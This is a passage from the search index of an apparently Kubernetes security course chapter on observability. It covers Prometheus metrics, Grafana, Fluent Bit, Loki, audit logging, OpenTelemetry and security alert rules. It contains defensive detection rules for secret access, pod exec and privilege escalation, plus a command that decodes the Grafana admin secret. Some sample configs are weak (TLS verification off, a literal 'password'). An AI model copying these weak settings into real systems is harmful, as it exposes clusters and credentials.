instrumented-app\n  podMetricsEndpoints:\n  - port: metrics\n    path: /metrics\n    interval: 30s\n</code></pre></p>"},{"location":"08-observability/#24-key-prometheus-metrics-for-security","title":"2.4 Key Prometheus Metrics for Security","text":"<p>API Server Metrics: <pre><code># Authentication failures\nrate(apiserver_authentication_failure_total[5m])\n\n# Authorization failures\nrate(apiserver_authorization_failure_total[5m])\n\n# API request rate by verb and user\nrate(apiserver_request_total[5m])\n\n# Requests to sensitive resources\napiserver_request_total{resource=\"secrets\"}\napiserver_request_total{resource=\"serviceaccounts\"}\n\n# Admission webhook failures\napiserver_admission_webhook_rejection_count\n</code></pre></p> <p>Container Security Metrics: <pre><code># Privileged containers\ncount(kube_pod_container_status_running{container_security_context_privileged=\"true\"})\n\n# Containers running as root\ncount(kube_pod_container_status_running{container_security_context_run_as_user=\"0\"})\n\n# Pods without resource limits\ncount(kube_pod_container_resource_limits{resource=\"memory\"} == 0)\n</code></pre></p> <p>Network Metrics: <pre><code># Network policy violations (requires CNI support)\nrate(cilium_policy_drop_total[5m])\n\n# Suspicious network connections\nrate(container_network_tcp_connections_total[5m]) &gt; 1000\n</code></pre></p>"},{"location":"08-observability/#25-prometheus-security-configuration","title":"2.5 Prometheus Security Configuration","text":"<p>Authentication and Authorization: <pre><code>apiVersion: monitoring.coreos.com/v1\nkind: Prometheus\nmetadata:\n  name: prometheus\n  namespace: monitoring\nspec:\n  # Security context\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 65534\n    fsGroup: 65534\n    seccompProfile:\n      type: RuntimeDefault\n\n  # Pod security\n  podSecurityContext:\n    runAsNonRoot: true\n    runAsUser: 65534\n\n  # Enable RBAC\n  serviceAccountName: prometheus\n\n  # Remote write with authentication\n  remoteWrite:\n  - url: https://remote-storage.example.com/api/v1/push\n    basicAuth:\n      username:\n        name: prometheus-creds\n        key: username\n      password:\n        name: prometheus-creds\n        key: password\n    tlsConfig:\n      ca:\n        secret:\n          name: remote-ca\n          key: ca.crt\n\n  # Encryption at rest\n  volumes:\n  - name: data\n    persistentVolumeClaim:\n      claimName: prometheus-data\n</code></pre></p>"},{"location":"08-observability/#3-grafana-dashboards","title":"3. Grafana Dashboards","text":""},{"location":"08-observability/#31-accessing-grafana","title":"3.1 Accessing Grafana","text":"<pre><code># Port-forward to Grafana\nkubectl port-forward -n monitoring svc/prometheus-grafana 3000:80\n\n# Or use LoadBalancer/Ingress\nkubectl patch svc prometheus-grafana -n monitoring -p '{\"spec\": {\"type\": \"LoadBalancer\"}}'\n\n# Get admin password (if using default)\nkubectl get secret -n monitoring prometheus-grafana -o jsonpath=\"{.data.admin-password}\" | base64 --decode\n</code></pre>"},{"location":"08-observability/#32-security-focused-dashboards","title":"3.2 Security-Focused Dashboards","text":"<p>API Server Security Dashboard: <pre><code>{\n  \"dashboard\": {\n    \"title\": \"Kubernetes Security - API Server\",\n    \"panels\": [\n      {\n        \"title\": \"Authentication Failures\",\n        \"targets\": [\n          {\n            \"expr\": \"rate(apiserver_authentication_failure_total[5m])\"\n          }\n        ],\n        \"type\": \"graph\"\n      },\n      {\n        \"title\": \"Authorization Failures by User\",\n        \"targets\": [\n          {\n            \"expr\": \"topk(10, rate(apiserver_authorization_failure_total[5m]))\"\n          }\n        ],\n        \"type\": \"graph\"\n      },\n      {\n        \"title\": \"Requests to Secrets\",\n        \"targets\": [\n          {\n            \"expr\": \"sum(rate(apiserver_request_total{resource=\\\"secrets\\\"}[5m])) by (verb, user)\"\n          }\n        ],\n        \"type\": \"table\"\n      },\n      {\n        \"title\": \"Admission Webhook Latency\",\n        \"targets\": [\n          {\n            \"expr\": \"histogram_quantile(0.99, rate(apiserver_admission_webhook_admission_duration_seconds_bucket[5m]))\"\n          }\n        ],\n        \"type\": \"graph\"\n      }\n    ]\n  }\n}\n</code></pre></p> <p>Pod Security Dashboard (PromQL queries): <pre><code># Privileged pods count\ncount(kube_pod_container_status_running{container_security_context_privileged=\"true\"}) by (namespace)\n\n# Pods running as root\ncount(kube_pod_container_status_running{container_security_context_run_as_user=\"0\"}) by (namespace, pod)\n\n# Pods without resource limits\ncount(kube_pod_container_info unless on(pod, namespace) kube_pod_container_resource_limits) by (namespace)\n\n# Host network usage\ncount(kube_pod_spec_host_network{host_network=\"true\"}) by (namespace)\n\n# Recent pod failures\nincrease(kube_pod_container_status_restarts_total[1h]) &gt; 3\n</code></pre></p> <p>Network Security Dashboard: <pre><code># Top talkers by pod\ntopk(10, sum(rate(container_network_transmit_bytes_total[5m])) by (pod))\n\n# Egress traffic by namespace\nsum(rate(container_network_transmit_bytes_total[5m])) by (namespace)\n\n# Network policy denies (Cilium)\nrate(cilium_policy_drop_total[5m])\n\n# DNS queries\nrate(coredns_dns_requests_total[5m])\n</code></pre></p>"},{"location":"08-observability/#33-creating-custom-dashboards","title":"3.3 Creating Custom Dashboards","text":"<p>Import Dashboard via UI: 1. Navigate to Dashboards \u2192 Import 2. Use dashboard ID from Grafana.com (e.g., 15757 for Kubernetes Cluster Monitoring) 3. Or paste JSON configuration</p> <p>Dashboard as Code (Terraform): <pre><code>resource \"grafana_dashboard\" \"security\" {\n  config_json = file(\"${path.module}/dashboards/security.json\")\n  folder      = grafana_folder.security.id\n}\n\nresource \"grafana_folder\" \"security\" {\n  title = \"Security Dashboards\"\n}\n</code></pre></p>"},{"location":"08-observability/#34-grafana-security-configuration","title":"3.4 Grafana Security Configuration","text":"<pre><code># values.yaml for Grafana Helm chart\ngrafana:\n  adminPassword: &lt;strong-password&gt;\n\n  # Authentication\n  grafana.ini:\n    server:\n      root_url: https://grafana.example.com\n    security:\n      admin_user: admin\n      secret_key: &lt;random-secret-key&gt;\n      disable_gravatar: true\n    auth:\n      disable_login_form: false\n    auth.anonymous:\n      enabled: false\n    auth.basic:\n      enabled: true\n    users:\n      allow_sign_up: false\n      auto_assign_org_role: Viewer\n\n  # RBAC\n  rbac:\n    enabled: true\n\n  # Security context\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 472\n    fsGroup: 472\n</code></pre>"},{"location":"08-observability/#4-log-aggregation","title":"4. Log Aggregation","text":""},{"location":"08-observability/#41-fluentd-architecture","title":"4.1 Fluentd Architecture","text":"<pre><code>graph LR\n    A[Container Logs] --&gt; B[Fluentd DaemonSet]\n    C[Audit Logs] --&gt; B\n    D[System Logs] --&gt; B\n\n    B --&gt; E[Log Processing]\n    E --&gt; F[Filter/Parse]\n    F --&gt; G[Enrich]\n\n    G --&gt; H[Elasticsearch]\n    G --&gt; I[Loki]\n    G --&gt; J[S3]\n    G --&gt; K[Splunk]\n\n    style B fill:#2a9d8f\n    style E fill:#e9c46a</code></pre>"},{"location":"08-observability/#42-installing-fluent-bit","title":"4.2 Installing Fluent Bit","text":"<p>Fluent Bit is a lightweight alternative to Fluentd, ideal for forwarding logs.</p> <p>Fluent Bit DaemonSet: <pre><code>apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: fluent-bit\n  namespace: logging\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: fluent-bit\nrules:\n- apiGroups: [\"\"]\n  resources: [\"namespaces\", \"pods\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: fluent-bit\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: fluent-bit\nsubjects:\n- kind: ServiceAccount\n  name: fluent-bit\n  namespace: logging\n---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: fluent-bit-config\n  namespace: logging\ndata:\n  fluent-bit.conf: |\n    [SERVICE]\n        Flush         5\n        Log_Level     info\n        Daemon        off\n        Parsers_File  parsers.conf\n\n    [INPUT]\n        Name              tail\n        Path              /var/log/containers/*.log\n        Parser            docker\n        Tag               kube.*\n        Refresh_Interval  5\n        Mem_Buf_Limit     50MB\n        Skip_Long_Lines   On\n\n    [FILTER]\n        Name                kubernetes\n        Match               kube.*\n        Kube_URL            https://kubernetes.default.svc:443\n        Kube_CA_File        /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        Kube_Token_File     /var/run/secrets/kubernetes.io/serviceaccount/token\n        Kube_Tag_Prefix     kube.var.log.containers.\n        Merge_Log           On\n        Keep_Log            Off\n        K8S-Logging.Parser  On\n        K8S-Logging.Exclude On\n\n    [OUTPUT]\n        Name            es\n        Match           *\n        Host            elasticsearch.logging.svc\n        Port            9200\n        Logstash_Format On\n        Logstash_Prefix fluent-bit\n        Type            _doc\n        tls             On\n        tls.verify      Off\n\n  parsers.conf: |\n    [PARSER]\n        Name   json\n        Format json\n        Time_Key time\n        Time_Format %Y-%m-%dT%H:%M:%S.%L%z\n\n    [PARSER]\n        Name        docker\n        Format      json\n        Time_Key    time\n        Time_Format %Y-%m-%dT%H:%M:%S.%L%z\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fluent-bit\n  namespace: logging\nspec:\n  selector:\n    matchLabels:\n      app: fluent-bit\n  template:\n    metadata:\n      labels:\n        app: fluent-bit\n    spec:\n      serviceAccountName: fluent-bit\n      containers:\n      - name: fluent-bit\n        image: fluent/fluent-bit:2.1\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1000\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: 200m\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n          readOnly: true\n        - name: varlibdockercontainers\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluent-bit-config\n          mountPath: /fluent-bit/etc/\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlibdockercontainers\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: fluent-bit-config\n        configMap:\n          name: fluent-bit-config\n</code></pre></p>"},{"location":"08-observability/#43-loki-for-log-storage","title":"4.3 Loki for Log Storage","text":"<p>Loki is a horizontally-scalable log aggregation system inspired by Prometheus.</p> <p>Install Loki Stack: <pre><code>helm repo add grafana https://grafana.github.io/helm-charts\nhelm install loki grafana/loki-stack \\\n  --namespace logging \\\n  --create-namespace \\\n  --set promtail.enabled=true \\\n  --set grafana.enabled=true \\\n  --set loki.persistence.enabled=true \\\n  --set loki.persistence.size=50Gi\n</code></pre></p> <p>Promtail Configuration (included in loki-stack): <pre><code># Scrape configs automatically discovered\nscrape_configs:\n- job_name: kubernetes-pods\n  kubernetes_sd_configs:\n  - role: pod\n  pipeline_stages:\n  - docker: {}\n  - match:\n      selector: '{app=\"myapp\"}'\n      stages:\n      - json:\n          expressions:\n            level: level\n            msg: message\n      - labels:\n          level:\n  relabel_configs:\n  - source_labels: [__meta_kubernetes_pod_name]\n    target_label: pod\n  - source_labels: [__meta_kubernetes_namespace]\n    target_label: namespace\n</code></pre></p> <p>Query Loki (LogQL): <pre><code># All logs from namespace\n{namespace=\"production\"}\n\n# Filter by log level\n{namespace=\"production\"} |= \"ERROR\"\n\n# JSON parsing\n{app=\"api\"} | json | level=\"error\"\n\n# Rate of errors\nrate({namespace=\"production\"} |= \"ERROR\" [5m])\n\n# Top error messages\ntopk(10, sum by (message) (rate({namespace=\"production\"} |= \"ERROR\" [5m])))\n</code></pre></p>"},{"location":"08-observability/#44-log-security-best-practices","title":"4.4 Log Security Best Practices","text":"<p>Exclude Sensitive Data: <pre><code># Fluent Bit filter to redact secrets\n[FILTER]\n    Name    modify\n    Match   *\n    Add     redacted true\n    Condition Key_value_matches log password=.*\n    Set     log \"password=[REDACTED]\"\n</code></pre></p> <p>Log Retention Policies: <pre><code># Loki retention configuration\nlimits_config:\n  retention_period: 744h  # 31 days\n\n# Table manager for retention\ntable_manager:\n  retention_deletes_enabled: true\n  retention_period: 744h\n</code></pre></p>"},{"location":"08-observability/#5-kubernetes-audit-logging","title":"5. Kubernetes Audit Logging","text":""},{"location":"08-observability/#51-audit-logging-overview","title":"5.1 Audit Logging Overview","text":"<p>Kubernetes audit logs provide a chronological record of API server activities.</p> <p>Audit Stages: 1. RequestReceived - Audit handler receives request 2. ResponseStarted - Response headers sent (long-running requests) 3. ResponseComplete - Response body completed 4. Panic - Events generated when panic occurs</p> <p>Audit Levels: - None - Don't log - Metadata - Log request metadata (user, timestamp, resource, verb) - Request - Log metadata and request body - RequestResponse - Log metadata, request, and response bodies</p>"},{"location":"08-observability/#52-audit-policy-configuration","title":"5.2 Audit Policy Configuration","text":"<pre><code># /etc/kubernetes/audit-policy.yaml\napiVersion: audit.k8s.io/v1\nkind: Policy\nomitStages:\n  - \"RequestReceived\"\n\nrules:\n  # Log all requests at RequestResponse level for debugging\n  # CAUTION: This generates large volumes of logs\n  - level: RequestResponse\n    resources:\n    - group: \"\"\n      resources: [\"secrets\", \"configmaps\"]\n    namespaces: [\"production\"]\n\n  # Log authentication/authorization failures\n  - level: Metadata\n    omitStages:\n    - \"RequestReceived\"\n    verbs: [\"get\", \"list\", \"watch\"]\n    resources:\n    - group: \"\"\n      resources: [\"secrets\", \"serviceaccounts\"]\n\n  # Log modifications to security resources\n  - level: RequestResponse\n    verbs: [\"create\", \"update\", \"patch\", \"delete\"]\n    resources:\n    - group: \"rbac.authorization.k8s.io\"\n      resources: [\"clusterroles\", \"clusterrolebindings\", \"roles\", \"rolebindings\"]\n    - group: \"\"\n      resources: [\"serviceaccounts\"]\n    - group: \"certificates.k8s.io\"\n      resources: [\"certificatesigningrequests\"]\n\n  # Log admission webhook decisions\n  - level: Metadata\n    verbs: [\"create\", \"update\"]\n    omitStages:\n    - \"RequestReceived\"\n\n  # Log pod exec/attach (potential attacker activity)\n  - level: Metadata\n    verbs: [\"create\"]\n    resources:\n    - group: \"\"\n      resources: [\"pods/exec\", \"pods/attach\", \"pods/portforward\"]\n\n  # Log all deletions\n  - level: Request\n    verbs: [\"delete\", \"deletecollection\"]\n\n  # Catch-all: log metadata for everything else\n  - level: Metadata\n    omitStages:\n    - \"RequestReceived\"\n</code></pre>"},{"location":"08-observability/#53-enabling-audit-logging","title":"5.3 Enabling Audit Logging","text":"<p>Configure API Server: <pre><code># /etc/kubernetes/manifests/kube-apiserver.yaml\nspec:\n  containers:\n  - command:\n    - kube-apiserver\n    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n    - --audit-log-path=/var/log/kubernetes/audit.log\n    - --audit-log-maxage=30\n    - --audit-log-maxbackup=10\n    - --audit-log-maxsize=100\n    # Or use webhook backend\n    - --audit-webhook-config-file=/etc/kubernetes/audit-webhook-config.yaml\n    - --audit-webhook-batch-max-wait=5s\n    volumeMounts:\n    - name: audit-policy\n      mountPath: /etc/kubernetes/audit-policy.yaml\n      readOnly: true\n    - name: audit-logs\n      mountPath: /var/log/kubernetes\n  volumes:\n  - name: audit-policy\n    hostPath:\n      path: /etc/kubernetes/audit-policy.yaml\n      type: File\n  - name: audit-logs\n    hostPath:\n      path: /var/log/kubernetes\n      type: DirectoryOrCreate\n</code></pre></p>"},{"location":"08-observability/#54-audit-webhook-backend","title":"5.4 Audit Webhook Backend","text":"<p>Webhook Configuration: <pre><code># /etc/kubernetes/audit-webhook-config.yaml\napiVersion: v1\nkind: Config\nclusters:\n- name: audit-webhook\n  cluster:\n    server: https://audit-collector.logging.svc.cluster.local:8443/audit\n    certificate-authority: /etc/kubernetes/pki/ca.crt\ncontexts:\n- context:\n    cluster: audit-webhook\n    user: audit-webhook\n  name: audit-webhook\ncurrent-context: audit-webhook\nusers:\n- name: audit-webhook\n  user:\n    client-certificate: /etc/kubernetes/pki/audit-webhook-client.crt\n    client-key: /etc/kubernetes/pki/audit-webhook-client.key\n</code></pre></p> <p>Audit Webhook Receiver (example): <pre><code>from flask import Flask, request, jsonify\nimport json\nimport logging\n\napp = Flask(__name__)\n\n@app.route('/audit', methods=['POST'])\ndef receive_audit():\n    audit_event = request.json\n\n    # Extract key information\n    kind = audit_event.get('kind')\n    api_version = audit_event.get('apiVersion')\n    level = audit_event.get('level')\n    stage = audit_event.get('stage')\n    verb = audit_event.get('verb')\n    user = audit_event.get('user', {}).get('username')\n    resource = audit_event.get('objectRef', {})\n\n    # Log to centralized logging system\n    logging.info(f\"Audit: {verb} {resource} by {user}\")\n\n    # Detect suspicious activity\n    if verb in ['delete', 'deletecollection'] and resource.get('resource') == 'secrets':\n        logging.warning(f\"ALERT: Secret deletion by {user}\")\n\n    return jsonify({\"received\": True}), 200\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8443, ssl_context=('cert.pem', 'key.pem'))\n</code></pre></p>"},{"location":"08-observability/#55-analyzing-audit-logs","title":"5.5 Analyzing Audit Logs","text":"<p>Query Examples: <pre><code># Failed authentication attempts\njq 'select(.responseStatus.code &gt;= 400) | select(.verb == \"authenticate\")' audit.log\n\n# Secret access\njq 'select(.objectRef.resource == \"secrets\")' audit.log\n\n# Admin actions\njq 'select(.user.username | contains(\"system:admin\"))' audit.log\n\n# Pod exec events\njq 'select(.objectRef.subresource == \"exec\")' audit.log\n\n# RBAC changes\njq 'select(.objectRef.apiGroup == \"rbac.authorization.k8s.io\")' audit.log\n</code></pre></p>"},{"location":"08-observability/#6-opentelemetry-and-distributed-tracing","title":"6. OpenTelemetry and Distributed Tracing","text":""},{"location":"08-observability/#61-opentelemetry-overview","title":"6.1 OpenTelemetry Overview","text":"<p>OpenTelemetry provides vendor-neutral instrumentation for metrics, logs, and traces.</p> <p>Components: - SDK - Instrumentation libraries - Collector - Receive, process, export telemetry - Exporter - Send data to backends (Jaeger, Zipkin, Prometheus)</p>"},{"location":"08-observability/#62-installing-opentelemetry-operator","title":"6.2 Installing OpenTelemetry Operator","text":"<pre><code># Install cert-manager (prerequisite)\nkubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.0/cert-manager.yaml\n\n# Install OpenTelemetry Operator\nkubectl apply -f https://github.com/open-telemetry/opentelemetry-operator/releases/latest/download/opentelemetry-operator.yaml\n</code></pre>"},{"location":"08-observability/#63-opentelemetry-collector-configuration","title":"6.3 OpenTelemetry Collector Configuration","text":"<pre><code>apiVersion: opentelemetry.io/v1alpha1\nkind: OpenTelemetryCollector\nmetadata:\n  name: otel-collector\n  namespace: observability\nspec:\n  mode: deployment\n  config: |\n    receivers:\n      otlp:\n        protocols:\n          grpc:\n            endpoint: 0.0.0.0:4317\n          http:\n            endpoint: 0.0.0.0:4318\n\n      # Prometheus receiver\n      prometheus:\n        config:\n          scrape_configs:\n          - job_name: 'kubernetes-pods'\n            kubernetes_sd_configs:\n            - role: pod\n\n    processors:\n      batch:\n        timeout: 10s\n        send_batch_size: 1024\n\n      # Add Kubernetes metadata\n      k8sattributes:\n        auth_type: \"serviceAccount\"\n        passthrough: false\n        extract:\n          metadata:\n          - k8s.pod.name\n          - k8s.pod.uid\n          - k8s.deployment.name\n          - k8s.namespace.name\n          - k8s.node.name\n\n    exporters:\n      # Jaeger for traces\n      jaeger:\n        endpoint: jaeger-collector.observability.svc:14250\n        tls:\n          insecure: false\n\n      # Prometheus for metrics\n      prometheus:\n        endpoint: 0.0.0.0:8889\n\n      # Loki for logs\n      loki:\n        endpoint: http://loki.logging.svc:3100/loki/api/v1/push\n\n    service:\n      pipelines:\n        traces:\n          receivers: [otlp]\n          processors: [k8sattributes, batch]\n          exporters: [jaeger]\n        metrics:\n          receivers: [otlp, prometheus]\n          processors: [k8sattributes, batch]\n          exporters: [prometheus]\n        logs:\n          receivers: [otlp]\n          processors: [k8sattributes, batch]\n          exporters: [loki]\n</code></pre>"},{"location":"08-observability/#64-instrumenting-applications","title":"6.4 Instrumenting Applications","text":"<p>Python Flask Example: <pre><code>from opentelemetry import trace\nfrom opentelemetry.sdk.trace import TracerProvider\nfrom opentelemetry.sdk.trace.export import BatchSpanProcessor\nfrom opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter\nfrom opentelemetry.instrumentation.flask import FlaskInstrumentor\nfrom flask import Flask\n\n# Initialize tracing\ntrace.set_tracer_provider(TracerProvider())\ntracer = trace.get_tracer(__name__)\n\n# Configure OTLP exporter\notlp_exporter = OTLPSpanExporter(\n    endpoint=\"otel-collector.observability.svc:4317\",\n    insecure=True\n)\nspan_processor = BatchSpanProcessor(otlp_exporter)\ntrace.get_tracer_provider().add_span_processor(span_processor)\n\n# Create Flask app\napp = Flask(__name__)\nFlaskInstrumentor().instrument_app(app)\n\n@app.route('/api/data')\ndef get_data():\n    with tracer.start_as_current_span(\"get_data\"):\n        # Your application logic\n        return {\"status\": \"ok\"}\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)\n</code></pre></p>"},{"location":"08-observability/#7-security-alerting","title":"7. Security Alerting","text":""},{"location":"08-observability/#71-alertmanager-configuration","title":"7.1 Alertmanager Configuration","text":"<pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: alertmanager-config\n  namespace: monitoring\ndata:\n  alertmanager.yml: |\n    global:\n      resolve_timeout: 5m\n      slack_api_url: 'https://hooks.slack.com/services/YOUR/WEBHOOK/URL'\n\n    route:\n      group_by: ['alertname', 'cluster', 'namespace']\n      group_wait: 10s\n      group_interval: 10s\n      repeat_interval: 12h\n      receiver: 'default'\n      routes:\n      # Critical security alerts\n      - match:\n          severity: critical\n        receiver: 'security-team'\n        continue: true\n\n      # High priority alerts\n      - match:\n          severity: warning\n        receiver: 'ops-team'\n\n    receivers:\n    - name: 'default'\n      slack_configs:\n      - channel: '#alerts'\n        title: 'Kubernetes Alert'\n        text: '{{ range .Alerts }}{{ .Annotations.summary }}{{ end }}'\n\n    - name: 'security-team'\n      slack_configs:\n      - channel: '#security-alerts'\n        title: '\ud83d\udea8 SECURITY ALERT'\n        text: '{{ range .Alerts }}{{ .Annotations.description }}{{ end }}'\n      email_configs:\n      - to: 'security@example.com'\n        from: 'alertmanager@example.com'\n        smarthost: 'smtp.example.com:587'\n        auth_username: 'alertmanager'\n        auth_password: 'password'\n\n    - name: 'ops-team'\n      slack_configs:\n      - channel: '#ops-alerts'\n</code></pre>"},{"location":"08-observability/#72-security-alert-rules","title":"7.2 Security Alert Rules","text":"<pre><code>apiVersion: monitoring.coreos.com/v1\nkind: PrometheusRule\nmetadata:\n  name: security-alerts\n  namespace: monitoring\nspec:\n  groups:\n  - name: kubernetes-security\n    interval: 30s\n    rules:\n    # Authentication failures\n    - alert: HighAuthenticationFailureRate\n      expr: rate(apiserver_authentication_failure_total[5m]) &gt; 5\n      for: 5m\n      labels:\n        severity: warning\n      annotations:\n        summary: \"High authentication failure rate\"\n        description: \"Authentication failure rate is {{ $value }} per second\"\n\n    # Authorization failures\n    - alert: HighAuthorizationFailureRate\n      expr: rate(apiserver_authorization_failure_total[5m]) &gt; 10\n      for: 5m\n      labels:\n        severity: warning\n      annotations:\n        summary: \"High authorization failure rate\"\n        description: \"Authorization failure rate is {{ $value }} per second\"\n\n    # Privileged pods\n    - alert: PrivilegedPodRunning\n      expr: count(kube_pod_container_status_running{container_security_context_privileged=\"true\"}) &gt; 0\n      for: 1m\n      labels:\n        severity: critical\n      annotations:\n        summary: \"Privileged pod detected\"\n        description: \"{{ $value }} privileged pods are running\"\n\n    # Pods running as root\n    - alert: PodRunningAsRoot\n      expr: count(kube_pod_container_status_running{container_security_context_run_as_user=\"0\"}) &gt; 5\n      for: 5m\n      labels:\n        severity: warning\n      annotations:\n        summary: \"Pods running as root detected\"\n        description: \"{{ $value }} pods are running as root user\"\n\n    # Secret access spike\n    - alert: SecretAccessSpike\n      expr: rate(apiserver_request_total{resource=\"secrets\"}[5m]) &gt; 10\n      for: 2m\n      labels:\n        severity: critical\n      annotations:\n        summary: \"Unusual secret access detected\"\n        description: \"Secret access rate is {{ $value }} per second\"\n\n    # Pod exec events\n    - alert: PodExecDetected\n      expr: rate(apiserver_request_total{verb=\"create\", resource=\"pods\", subresource=\"exec\"}[5m]) &gt; 0.1\n      for: 1m\n      labels:\n        severity: warning\n      annotations:\n        summary: \"Pod exec activity detected\"\n        description: \"Pod exec rate is {{ $value }} per second\"\n\n    # RBAC modification\n    - alert: RBACModification\n      expr: rate(apiserver_request_total{verb=~\"create|update|patch|delete\", resource=~\"roles|rolebindings|clusterroles|clusterrolebindings\"}[5m]) &gt; 0\n      for: 1m\n      labels:\n        severity: critical\n      annotations:\n        summary: \"RBAC modification detected\"\n        description: \"RBAC resources are being modified\"\n\n    # Network policy violations (Cilium)\n    - alert: NetworkPolicyViolations\n      expr: rate(cilium_policy_drop_total[5m]) &gt; 10\n      for: 5m\n      labels:\n        severity: warning\n      annotations:\n        summary: \"High rate of network policy violations\"\n        description: \"Network policy violation rate is {{ $value }} per second\"\n\n    # Container restart loop\n    - alert: PodCrashLooping\n      expr: rate(kube_pod_container_status_restarts_total[15m]) &gt; 0.1\n      for: 5m\n      labels:\n        severity: warning\n      annotations:\n        summary: \"Pod is crash looping\"\n        description: \"Pod {{ $labels.namespace }}/{{ $labels.pod }} is restarting frequently\"\n</code></pre>"},{"location":"08-observability/#73-log-based-alerts-loki","title":"7.3 Log-Based Alerts (Loki)","text":"<pre><code># Loki alerting rules\ngroups:\n- name: log-alerts\n  interval: 1m\n  rules:\n  - alert: HighErrorRate\n    expr: |\n      sum(rate({namespace=\"production\"} |= \"ERROR\" [5m])) by (namespace)\n      &gt; 10\n    for: 5m\n    labels:\n      severity: warning\n    annotations:\n      summary: \"High error rate in {{ $labels.namespace }}\"\n\n  - alert: AuthenticationFailureInLogs\n    expr: |\n      sum(rate({namespace=~\".+\"} |= \"authentication failed\" [5m])) &gt; 5\n    for: 2m\n    labels:\n      severity: critical\n    annotations:\n      summary: \"Authentication failures detected in logs\"\n\n  - alert: PrivilegeEscalationAttempt\n    expr: |\n      count_over_time({namespace=~\".+\"} |~ \"(?i)(privilege escalation|sudo|su root)\" [5m]) &gt; 0\n    for: 1m\n    labels:\n      severity: critical\n    annotations:\n      summary: \"Potential privilege escalation attempt detected\"\n</code></pre>"},{"location":"08-observability/#8-observability-stack-security","title":"8. Observability Stack Security","text":""},{"location":"08-observability/#81-securing-prometheus","title":"8.1 Securing Prometheus","text":"<pre><code># Network policy for Prometheus\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: prometheus-netpol\n  namespace: monitoring\nspec:\n  podSelector:\n    matchLabels:\n      app: prometheus\n  policyTypes:\n  - Ingress\n  - Egress\n  ingress:\n  # Allow Grafana\n  - from:\n    - podSelector:\n        matchLabels:\n          app: grafana\n    ports:\n    - protocol: TCP\n      port: 9090\n  # Allow Alertmanager\n  - from:\n    - podSelector:\n        matchLabels:\n          app: alertmanager\n    ports:\n    - protocol: TCP\n      port: 9090\n  egress:\n  # Allow scraping targets\n  - to:\n    - namespaceSelector: {}\n    ports:\n    - protocol: TCP\n      port: 8080\n  # Allow DNS\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n</code></pre>"},{"location":"08-observability/#82-encryption-at-rest","title":"8.2 Encryption at Rest","text":"<pre><code># Encrypted storage for Prometheus\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: prometheus-data\n  namespace: monitoring\nspec:\n  accessModes:\n  - ReadWriteOnce\n  resources:\n    requests:\n      storage: 50Gi\n  storageClassName: encrypted-ssd\n</code></pre>"},{"location":"08-observability/#83-access-control","title":"8.3 Access Control","text":"<pre><code># RBAC for Prometheus\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: prometheus\nrules:\n- apiGroups: [\"\"]\n  resources:\n  - nodes\n  - nodes/metrics\n  - services\n  - endpoints\n  - pods\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"\"]\n  resources:\n  - configmaps\n  verbs: [\"get\"]\n- nonResourceURLs: [\"/metrics\"]\n  verbs: [\"get\"]\n</code></pre>"},{"location":"08-observability/#9-best-practices","title":"9. Best Practices","text":""},{"location":"08-observability/#91-observability-checklist","title":"9.1 Observability Checklist","text":"<ul> <li>\u2705 Metrics Collection</li> <li>Prometheus deployed with HA configuration</li> <li>ServiceMonitors for all applications</li> <li>Security-focused metrics monitored</li> <li> <p>Long-term storage (Thanos/Cortex)</p> </li> <li> <p>\u2705 Log Aggregation</p> </li> <li>Centralized logging (Loki/Elasticsearch)</li> <li>Container logs collected</li> <li>Audit logs forwarded</li> <li> <p>Log retention policy defined</p> </li> <li> <p>\u2705 Distributed Tracing</p> </li> <li>OpenTelemetry collector deployed</li> <li>Critical services instrumented</li> <li> <p>Trace sampling configured</p> </li> <li> <p>\u2705 Alerting</p> </li> <li>Security alerts configured</li> <li>On-call rotations defined</li> <li>Runbooks documented</li> <li> <p>Alert fatigue minimized</p> </li> <li> <p>\u2705 Security</p> </li> <li>Observability stack secured</li> <li>Network policies applied</li> <li>RBAC configured</li> <li>Data encrypted</li> </ul>"},{"location":"08-observability/#92-performance-optimization","title":"9.2 Performance Optimization","text":"<p>Metric Relabeling: <pre><code># Drop high-cardinality metrics\nmetric_relabel_configs:\n- source_labels: [__name__]\n  regex: 'etcd_request_duration_seconds_bucket'\n  action: drop\n</code></pre></p> <p>Log Sampling: <pre><code># Fluent Bit sampling\n[FILTER]\n    Name    sampling\n    Match   *\n    Percentage 10  # Keep 10% of logs\n</code></pre></p>"},{"location":"08-observability/#10-security-checklist","title":"10. Security Checklist","text":"<ul> <li>[ ] Metrics Monitoring</li> <li>[ ] Prometheus deployed with security context</li> <li>[ ] Metrics endpoints secured</li> <li>[ ] Network policies applied</li> <li> <p>[ ] Security-focused dashboards created</p> </li> <li> <p>[ ] Log Management</p> </li> 